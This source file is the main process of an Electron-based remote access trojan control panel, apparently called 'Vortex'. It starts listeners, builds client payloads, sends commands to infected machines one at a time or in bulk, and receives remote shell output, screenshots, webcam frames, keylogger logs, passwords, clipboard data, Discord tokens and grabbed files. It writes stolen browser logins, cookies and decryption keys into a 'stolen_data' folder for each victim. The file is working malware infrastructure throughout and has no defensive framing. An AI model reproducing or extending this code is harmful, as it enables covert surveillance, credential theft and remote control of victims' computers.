const { app, BrowserWindow, ipcMain, dialog, shell } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const VortexServer = require('./server');
const ClientBuilder = require('./builder');

const rootPath = app.isPackaged ? path.dirname(process.execPath) : __dirname;
const buildsPath = path.join(rootPath, 'builds');
const stolenDataPath = path.join(rootPath, 'stolen_data');
const configPath = path.join(rootPath, 'config.json');

let mainWindow;
const server = new VortexServer();
const builder = new ClientBuilder(buildsPath);

function createWindow() {
  mainWindow = new BrowserWindow({
    width: 1280,
    height: 720,
    minWidth: 1100,
    minHeight: 650,
    frame: false,
    transparent: false,
    backgroundColor: '#0a0a0a',
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    },
    icon: path.join(__dirname, 'icon.ico')
  });

  mainWindow.loadFile('index.html');
  mainWindow.setMenuBarVisibility(false);

  mainWindow.on('closed', () => {
    server.stopAll();
    mainWindow = null;
  });
}

app.whenReady().then(createWindow);

app.on('window-all-closed', () => {
  server.stopAll();
  if (process.platform !== 'darwin') app.quit();
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) createWindow();
});


function sendToRenderer(channel, data) {
  if (mainWindow && !mainWindow.isDestroyed()) {
    mainWindow.webContents.send(channel, data);
  }
}

ipcMain.on('window-minimize', () => mainWindow && mainWindow.minimize());
ipcMain.on('window-maximize', () => {
  if (mainWindow) {
    mainWindow.isMaximized() ? mainWindow.unmaximize() : mainWindow.maximize();
  }
});
ipcMain.on('window-close', () => mainWindow && mainWindow.close());

ipcMain.handle('server-start', (event, port) => {
  return server.startListener(parseInt(port));
});

ipcMain.handle('server-stop', (event, port) => {
  return server.stopListener(parseInt(port));
});

ipcMain.handle('server-start-all', (event, ports) => {
  const results = {};
  for (const p of ports) {
    results[p] = server.startListener(parseInt(p));
  }
  return results;
});

ipcMain.handle('server-stop-all', () => {
  server.stopAll();
  return true;
});

ipcMain.handle('server-get-stats', () => {
  return server.getStats();
});

ipcMain.handle('server-get-clients', () => {
  return server.getClientList();
});

ipcMain.handle('client-send-command', (event, clientId, command) => {
  return server.sendCommand(clientId, command);
});

ipcMain.handle('client-send-to-all', (event, command) => {
  return server.sendToAll(command);
});

ipcMain.handle('client-send-to-selected', (event, command) => {
  return server.sendToSelected(command);
});

ipcMain.handle('client-select', (event, clientId, selected) => {
  server.selectClient(clientId, selected);
  return true;
});

ipcMain.handle('set-auto-tasks', (event, tasks) => {
  Object.assign(server.autoTasks, tasks);
  return true;
});

ipcMain.handle('build-client', async (event, config) => {
  try {
    const result = await builder.build(config);
    return result;
  } catch (err) {
    return { success: false, error: err.message };
  }
});

ipcMain.handle('open-builds-folder', () => {
  if (!fs.existsSync(buildsPath)) fs.mkdirSync(buildsPath, { recursive: true });
  shell.openPath(buildsPath);
  return true;
});

ipcMain.handle('select-icon-file', async () => {
  const result = await dialog.showOpenDialog(mainWindow, {
    title: 'Select Icon',
    filters: [{ name: 'Icons', extensions: ['ico', 'png', 'jpg'] }],
    properties: ['openFile']
  });
  return result.canceled ? null : result.filePaths[0];
});

ipcMain.handle('save-file', async (event, filename, base64Data) => {
  const result = await dialog.showSaveDialog(mainWindow, {
    title: 'Save File',
    defaultPath: filename
  });
  if (!result.canceled && result.filePath) {
    fs.writeFileSync(result.filePath, Buffer.from(base64Data, 'base64'));
    return result.filePath;
  }
  return null;
});

ipcMain.handle('save-config', (event, config) => {
  fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
  return true;
});

ipcMain.handle('load-config', () => {
  if (fs.existsSync(configPath)) {
    return JSON.parse(fs.readFileSync(configPath, 'utf8'));
  }
  return null;
});

server.on('log', (type, message) => {
  sendToRenderer('log', { type, message });
});

server.on('client-connected', (clientId, clientInfo) => {
  sendToRenderer('client-connected', {
    id: clientId,
    ip: clientInfo.ip,
    port: clientInfo.port
  });
});

server.on('client-disconnected', (clientId) => {
  sendToRenderer('client-disconnected', clientId);
});

server.on('client-info', (clientId, client) => {
  sendToRenderer('client-info', {
    id: clientId,
    ip: client.ip,
    port: client.port,
    username: client.info.username || 'N/A',
    hostname: client.info.hostname || 'N/A',
    os: client.info.os || 'N/A',
    country: client.info.country || 'N/A',
    group: client.group,
    ping: client.ping,
    selected: client.selected
  });
});

server.on('shell-output', (clientId, data) => {
  sendToRenderer('shell-output', { clientId, data });
});

server.on('screenshot', (clientId, data) => {
  sendToRenderer('screenshot', { clientId, data });
});

server.on('file-list', (clientId, data) => {
  sendToRenderer('file-list', { clientId, data });
});

server.on('file-download', (clientId, data) => {
  sendToRenderer('file-download', { clientId, data });
});

server.on('file-upload-result', (clientId, data) => {
  sendToRenderer('file-upload-result', { clientId, data });
});

server.on('process-list', (clientId, data) => {
  sendToRenderer('process-list', { clientId, data });
});

server.on('process-kill-result', (clientId, data) => {
  sendToRenderer('process-kill-result', { clientId, data });
});

server.on('keylogger-data', (clientId, data) => {
  sendToRenderer('keylogger-data', { clientId, data });
});

server.on('passwords', (clientId, data) => {
  sendToRenderer('passwords', { clientId, data });
});

server.on('clipboard-data', (clientId, data) => {
  sendToRenderer('clipboard-data', { clientId, data });
});

server.on('grabbed-files', (clientId, data) => {
  sendToRenderer('grabbed-files', { clientId, data });
});

server.on('webcam-frame', (clientId, data) => {
  sendToRenderer('webcam-frame', { clientId, data });
});

server.on('system-info-detail', (clientId, data) => {
  sendToRenderer('system-info-detail', { clientId, data });
});

server.on('discord-tokens', (clientId, data) => {
  sendToRenderer('discord-tokens', { clientId, data });
});

server.on('browser-data', (clientId, items) => {
  const baseDir = path.join(stolenDataPath, clientId);
  let savedCount = 0;
  
  try {
    if (!fs.existsSync(baseDir)) fs.mkdirSync(baseDir, { recursive: true });

    items.forEach(item => {
      const profileDir = path.join(baseDir, item.browser, item.profile || 'Default');
      if (!fs.existsSync(profileDir)) fs.mkdirSync(profileDir, { recursive: true });

      fs.writeFileSync(path.join(profileDir, 'Key.txt'), item.key);
      
      if (item.loginData) {
        fs.writeFileSync(path.join(profileDir, 'Login Data'), Buffer.from(item.loginData, 'base64'));
        savedCount++;
      }
      if (item.cookies) {
        fs.writeFileSync(path.join(profileDir, 'Cookies'), Buffer.from(item.cookies, 'base64'));
        savedCount++;
      }
    });

    sendToRenderer('log', { type: 'SUCCESS', msg: `Saved browser data for ${clientId}` });
    sendToRenderer('browser-data-saved', { clientId, count: savedCount, path: baseDir });
  } catch(err) {
    console.error('Error saving browser data:', err);
  }
});

setInterval(() => {
  server.pingAll();
}, 15000);

setInterval(() => {
  sendToRenderer('stats-update', server.getStats());
}, 2000);

